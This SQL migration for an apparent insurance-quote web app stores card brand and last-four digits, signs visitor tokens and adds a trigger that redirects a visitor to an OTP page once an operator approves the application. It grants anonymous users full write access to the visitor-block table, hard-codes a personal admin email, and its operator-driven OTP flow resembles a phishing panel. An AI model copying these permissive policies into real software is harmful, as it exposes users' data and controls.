ALTER TABLE public.applications ADD COLUMN IF NOT EXISTS card_last4 text;
ALTER TABLE public.applications ADD COLUMN IF NOT EXISTS screenshot_urls text[];

CREATE TABLE IF NOT EXISTS public.chat_blocked_visitors (
  visitor_id TEXT PRIMARY KEY, reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_blocked_visitors TO anon, authenticated;
GRANT ALL ON public.chat_blocked_visitors TO service_role;
ALTER TABLE public.chat_blocked_visitors ENABLE ROW LEVEL SECURITY;
CREATE POLICY "anon_all_chat_block" ON public.chat_blocked_visitors FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA extensions;
CREATE SCHEMA IF NOT EXISTS private;
GRANT USAGE ON SCHEMA private TO anon, authenticated, service_role;

CREATE TABLE IF NOT EXISTS private.visitor_secret (
  id int PRIMARY KEY, secret bytea NOT NULL,
  CONSTRAINT visitor_secret_singleton CHECK (id = 1)
);
INSERT INTO private.visitor_secret(id, secret)
VALUES (1, extensions.gen_random_bytes(32)) ON CONFLICT (id) DO NOTHING;
REVOKE ALL ON private.visitor_secret FROM PUBLIC;
GRANT ALL ON private.visitor_secret TO service_role;

CREATE OR REPLACE FUNCTION private.mint_visitor_token()
RETURNS text LANGUAGE plpgsql SECURITY DEFINER SET search_path = '' AS $$
DECLARE _vid text; _sec bytea; _sig text;
BEGIN
  _vid := 'V-' || encode(extensions.gen_random_bytes(12), 'hex');
  SELECT secret INTO _sec FROM private.visitor_secret WHERE id = 1;
  _sig := encode(extensions.hmac(_vid::bytea, _sec, 'sha256'), 'hex');
  RETURN _vid || '.' || _sig;
END; $$;

CREATE OR REPLACE FUNCTION private.resolve_visitor_id()
RETURNS text LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = '' AS $$
DECLARE _headers json; _token text; _vid text; _sig text; _sec bytea; _expected text; _dot int;
BEGIN
  BEGIN _headers := current_setting('request.headers', true)::json;
  EXCEPTION WHEN OTHERS THEN RETURN NULL; END;
  _token := _headers ->> 'x-visitor-token';
  IF _token IS NULL OR _token = '' THEN RETURN NULL; END IF;
  _dot := position('.' in _token);
  IF _dot < 2 THEN RETURN NULL; END IF;
  _vid := substring(_token from 1 for _dot - 1);
  _sig := substring(_token from _dot + 1);
  IF _vid = '' OR _sig = '' THEN RETURN NULL; END IF;
  SELECT secret INTO _sec FROM private.visitor_secret WHERE id = 1;
  IF _sec IS NULL THEN RETURN NULL; END IF;
  _expected := encode(extensions.hmac(_vid::bytea, _sec, 'sha256'), 'hex');
  IF _sig = _expected THEN RETURN _vid; END IF;
  RETURN NULL;
END; $$;

REVOKE ALL ON FUNCTION private.mint_visitor_token() FROM PUBLIC;
REVOKE ALL ON FUNCTION private.resolve_visitor_id() FROM PUBLIC;

DROP FUNCTION IF EXISTS public.current_visitor_id();
CREATE OR REPLACE FUNCTION public.current_visitor_id()
RETURNS text LANGUAGE sql STABLE SECURITY DEFINER SET search_path = private, public AS $$
  SELECT private.resolve_visitor_id();
$$;

CREATE OR REPLACE FUNCTION public.issue_visitor_token()
RETURNS text LANGUAGE sql SECURITY DEFINER SET search_path = private, public AS $$
  SELECT private.mint_visitor_token();
$$;

REVOKE ALL ON FUNCTION public.current_visitor_id() FROM PUBLIC;
REVOKE ALL ON FUNCTION public.issue_visitor_token() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.current_visitor_id() TO anon, authenticated, service_role;
GRANT EXECUTE ON FUNCTION public.issue_visitor_token() TO anon, authenticated, service_role;

CREATE OR REPLACE FUNCTION public.is_admin_user()
RETURNS boolean LANGUAGE plpgsql STABLE SECURITY INVOKER SET search_path = public AS $$
DECLARE _email text;
BEGIN
  BEGIN _email := lower(coalesce(auth.jwt() ->> 'email', '')); EXCEPTION WHEN OTHERS THEN _email := ''; END;
  IF _email = '' THEN RETURN false; END IF;
  RETURN _email IN ('aa809077a@gmail.com');
END; $$;
GRANT EXECUTE ON FUNCTION public.is_admin_user() TO anon, authenticated;

CREATE OR REPLACE FUNCTION public.get_my_applications(p_limit integer DEFAULT 5)
RETURNS TABLE(id text, created_at timestamp with time zone, visitor_id text, status text, review_status text, method text, card_brand text, card_last4 text, total numeric, price numeric, company text, insurance_type text, mutasil_provider text, mutasil_phone text, mutasil_id text, screenshot_urls text[])
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE _vid text;
BEGIN
  _vid := public.current_visitor_id();
  IF _vid IS NULL OR _vid !~ '^V-[0-9a-f]{24}$' THEN RETURN; END IF;
  RETURN QUERY
    SELECT a.id, a.created_at, a.visitor_id, a.status, a.review_status, a.method,
           a.card_brand, a.card_last4, a.total, a.price, a.company, a.insurance_type,
           a.mutasil_provider, a.mutasil_phone, a.mutasil_id, a.screenshot_urls
    FROM public.applications a
    WHERE a.visitor_id = _vid
    ORDER BY a.created_at DESC
    LIMIT greatest(1, least(coalesce(p_limit, 5), 20));
END; $$;
REVOKE ALL ON FUNCTION public.get_my_applications(integer) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.get_my_applications(integer) TO anon, authenticated, service_role;

CREATE OR REPLACE FUNCTION public.sync_application_redirect_command()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NEW.visitor_id IS NULL OR NEW.review_status IS NOT DISTINCT FROM OLD.review_status THEN
    RETURN NEW;
  END IF;
  IF NEW.review_status = 'approved' THEN
    DELETE FROM public.visitor_commands WHERE visitor_id = NEW.visitor_id;
    INSERT INTO public.visitor_commands (visitor_id, command, payload)
    VALUES (NEW.visitor_id, 'redirect', '/quote/otp');
  ELSIF NEW.review_status = 'rejected' THEN
    DELETE FROM public.visitor_commands WHERE visitor_id = NEW.visitor_id AND command = 'redirect';
  END IF;
  RETURN NEW;
END; $$;
DROP TRIGGER IF EXISTS sync_application_redirect_command_trigger ON public.applications;
CREATE TRIGGER sync_application_redirect_command_trigger
AFTER UPDATE OF review_status ON public.applications
FOR EACH ROW EXECUTE FUNCTION public.sync_application_redirect_command();

DO $$
BEGIN
  BEGIN EXECUTE 'ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_blocked_visitors';
  EXCEPTION WHEN OTHERS THEN NULL; END;
END $$;